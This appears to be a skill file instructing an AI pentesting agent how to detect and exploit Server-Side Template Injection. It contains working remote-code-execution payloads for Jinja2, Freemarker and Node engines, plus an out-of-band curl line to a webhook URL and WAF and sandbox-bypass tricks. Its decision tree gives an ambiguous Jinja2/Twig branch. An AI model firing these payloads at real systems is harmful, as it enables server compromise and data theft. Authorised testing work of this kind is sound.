---
name: ssti-detect
description: Finding Server-Side Template Injection vulnerabilities in web applications.
---

# Overview

Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.

SSTI can affect various template engines across different programming languages:
- **Python:** Jinja2, Mako, Tornado, Twig (Python implementation)

- **Java:** Velocity, Freemarker, Thymeleaf, Expression Language (EL)

- **JavaScript/Node.js:** EJS, Pug/Jade, Handlebars, Mustache

- **PHP:** Twig, Smarty

- **Ruby:** Liquid, Slim

# Mindset

When operating as an AI pentester or bug bounty hunter, you must adopt the following mindset rules:
1. **Context over Guesswork:** Never assume a template engine based solely on the technology stack. Let the application's feedback, error messages, and mathematical execution guide your decisions.

2. **Deterministic & Methodical:** Treat SSTI hunting as a clear step-by-step pipeline: Detect -> Identify -> Exploit -> Verify. Do not skip steps or spray complex RCE payloads before confirming the injection point.

3. **Zero False Positives:** Every vulnerability report must be backed by clear proof-of-concept (PoC) evidence showing either a successful mathematical execution (e.g., `7*7=49`) or safe system context retrieval.

4. **Environment-Aware Safety:** Prioritize non-destructive payloads. When attempting code execution, use benign diagnostic commands (e.g., `id`, `whoami`, `hostname`) rather than destructive actions.

# Approach 

Your approach must be structured systematically following the Strix dynamic validation and OWASP input testing principles:

1. **Information Gathering & Attack Surface Mapping:** Identify all entry points where user input reflects back in the application response, or influences template-generated content (e.g., profiles, emails, custom pages, search fields).

2. **Fuzzing & Detection:** Inject polyglot parameters or specific math sequences to observe if the server interprets them as executable instructions rather than literal strings.

3. **Engine Identification:** Utilize a binary elimination tree or specific dialect anomalies (such as tracking error handling, behavior on invalid syntax, or unique delimiter variations like `${...}`, `{{...}}`, `<%= ... %>`) to narrow down the exact template engine version.

4. **Context-Specific Exploitation:** Inspect the engine documentation and known language primitives (e.g., Python MRO, Java Reflection, Node.js process objects) to break out of the template sandbox and execute system actions.

# Methodology

> Must follow a structured methodology to ensure comprehensive coverage and accurate identification of SSTI vulnerabilities:

## Step 1: Identification input vectors
- The attacker first locates an input field, URL parameter, or any user-controllable part of the application that is passed into a server-side template without proper sanitization or escaping.

  - For example, the attacker might identify a web form, search bar, or template preview functionality that seems to return results based on dynamic user input.

TIP: Generated PDF files, invoices and emails usually use a template.


## Step 2: Identify tech stack
- Using this decision tree, systematically test payloads to narrow down the template engine based on the application's response to mathematical execution and error handling:
```
${7*7} (Initial Probe)
├── Success (Evaluated) ── a{*comment*}b
│   ├── Success ── [Smarty]
│   └── Fail ── ${"z".join("ab")}
│       ├── Success ── [Mako]
│       └── Fail ── [Unknown]
└── Fail (Not Evaluated) ── {{7*7}}
    ├── Success ── {{7*'7'}}
    │   ├── Success ── [Jinja2]
    │   ├── Success ── [Twig]
    │   └── Fail ── [Unknown]
    └── Fail ── [Not vulnerable]
```

- Or using polyglot payload will trigger an error in presence of a SSTI vulnerability:
```
${{<%[%'"}}%\.
```

- Depending on the response, you can further test with engine-specific payloads to confirm the exact template engine and version, which will guide your exploitation strategy.
  - Python: Django, Jinja2, Mako, ...
  - Java: Freemarker, Jinjava, Velocity, ...
  - Ruby: ERB, Slim, ...

## Step 3: Advanced detection techniques
- If the initial probes do not yield clear results, you can use more advanced techniques: Blind SSTI Detection

If the application does not return error messages or the output is sanitized, you can use blind techniques to confirm SSTI

- Use time-based payloads to detect if the server is executing your input. 
  - Example: Jinja2 payload to sleep for 5 seconds:
    ```
    {{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}
    ```
- Use out-of-band (OOB) techniques to exfiltrate data or confirm execution.
  - Example: Jinja2 payload to make an HTTP request to your server:
    ```
    {{ cycler.__init__.__globals__.os.popen('curl http://webhook.site/....').read() }}
    ```

## Step 4: Confirmation

- Once you have confirmed the presence of SSTI and identified the template engine, you can craft specific payloads to achieve remote code execution (RCE) with system info (e.g., `id`, `whoami`) or read hosts files (`/etc/passwd`, `/etc/shadow`, ... ).

- `DO NOT read or write sensitive files without explicit permission.` Always use non-destructive payloads to demonstrate the vulnerability.

# Examples

- Django:
  ```
  {% csrf_token %} # Causes error with Jinja2
  {{ 7*7 }}  # Error with Django Templates
  ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
  ```
- Jinja2:
  ```
  <pre>{% debug %}</pre>
  {{ cycler.__init__.__globals__.os.popen('id').read() }}
  ```
- Freemarker:
  ```
  <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
  [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
  ${"freemarker.template.utility.Execute"?new()("id")}
  #{"freemarker.template.utility.Execute"?new()("id")}
  [="freemarker.template.utility.Execute"?new()("id")]
  ```
- Razor:
  ```
  @(1+2)
  ```

# Tips & Tricks

## Cheat Sheet

- Alway follow the structured approach: Detect -> Identify -> Exploit -> Verify. Do not skip steps.
- Depend on template engine on below table to craft specific payloads for detection and exploitation:

  | Tech stack         | Instruction          |
  | ------------------ | -------------------- |
  | Elixir             | `./assets/Elixir.md` |
  | PHP                | `./assets/PHP.md`    |
  | Python             | `./assets/Python.md` |
  | Ruby               | `./assets/Ruby.md`   |
  | ASP.NET            | `./assets/ASP.md`    |
  | Java               | `./assets/Java.md`   |
  | JavaScript/Node.js | `./assets/JavaScript.md`   |

## Bypass WAF techniques

**Sandbox escape — generic patterns**

- **Attribute lookup instead of direct access**: `{{x.__class__}}` blocked? try `{{x|attr('__class__')}}`
- **Class walk to recover deleted builtins**: `{{[].__class__.__base__.__subclasses__()}}` enumerates everything loaded
- **String constructor games**: `'__import__'.__class__` etc., when literal `__import__` is filtered
- **Filter / function aliasing**: same callable reachable via different names — find one not on the denylist
- **Implicit conversion**: object whose `__str__` / `toString` triggers code, coerced via concatenation

**Filter and parser evasion**

- Whitespace / case variants in keywords: `{{7 *7}}`, `{{ 7*7 }}`, `{{7*7}}`
- String concatenation to assemble denylisted identifiers: `{{('__cl'+'ass__')}}`, `{{request|attr('__cl'~'ass__')}}` — splits a token without a comment (Jinja's lexer doesn't recognize `{#` inside expression mode, so SQL-style `/**/` token splitting doesn't work here)
- Encoding layering: payload arrives URL-encoded, JSON-decoded, then template-rendered — pick the encoding that survives the filter but is decoded before render
- Operator precedence games: `((7)*(7))`, `7**7`, `7+0+7`
- Null byte truncation: `{{x%00.evil}}` — terminates payload for some pre-template filters but not the template parser
- Unicode normalization: smart quotes, fullwidth digits — bypasses naive denylists, normalizes back during render

**Polyglot and chained evaluation**

- Multi-engine pipelines: output of engine A feeds engine B — craft payload valid in both, or escape A and inject for B
- Markdown / RST embedded in a template — Markdown parser may strip your payload, but a code block survives and reaches the template
- Format string → template: printf-style format applied before template render; payload that's inert as a format string but live as a template

## False Positives

- Template syntax reflected literally (`{{7*7}}` rendered as `{{7*7}}`) — that's XSS-shaped, not SSTI
- Sandboxed environments where reflection succeeds but reachable objects expose nothing useful (Jinja `SandboxedEnvironment` with no `request` / `config` in context)
- Client-side template engines (Vue, Angular, Mustache running in the browser) — that's client-side template injection, different impact (XSS, not RCE)
- Markdown / static-site generators that template at build time only, with no user input reaching the build
- Engines where the output is HTML-escaped before display, masking evaluation as XSS-like reflection — verify with a non-HTML probe (`{{7*7}}` numeric)

## High-Value Targets

- Email rendering pipelines (subject / body / "from" templates)
- PDF / report generators (server-side render → headless browser)
- CMS theme and plugin editors
- Webhook and notification payload templates
- API response formatters that interpolate strings (pagination labels, error messages, custom field renders)
- Admin / tenant template editors — explicit "edit your template" features

## Pro Tips

1. Always confirm with a second math probe (`{{7*8}}`) before celebrating — single-shot reflection of `49` could be coincidental
2. Engine fingerprint first, gadget chain second — wrong-engine payloads are wasted requests and noise in WAF logs
3. For Jinja, the highest-yield reachable global varies by framework (`request` in Flask, `config` always present, `cycler` in older Jinja); spray all three before walking subclasses
4. SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring Cloud Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
5. EJS / Nunjucks are common in Express / Koa apps — `require('child_process').execSync('id')` if `require` is in scope (EJS), or escape via `range.constructor("return require('child_process')...")()` for Nunjucks; `process.mainModule.require(...)` is the older form, deprecated since Node 14
6. Sandbox escapes are usually one indirection away — `attr` lookup, constructor traversal, MRO walk; most "sandboxed" environments still reach the runtime if you go through attribute access instead of direct reference
7. Output not reflected? Time-based and OAST work as well as for SQLi — `${T(java.lang.Thread).sleep(5000)}` for SpEL, `{{cycler.__init__.__globals__.__import__('time').sleep(5)}}` (or the `request.application.__globals__.__builtins__` walk in Flask) for Jinja — bare `__import__` is not in the template namespace and will raise `UndefinedError`
8. Email previews and PDF generators are gold mines — they're often built on the same engine as the public site but exposed to less-validated input flows

# References

- OWASp SSTI: https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection
- PortSwigger SSTI: https://portswigger.net/web-security/server-side-template-injection
- Payload all the things: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md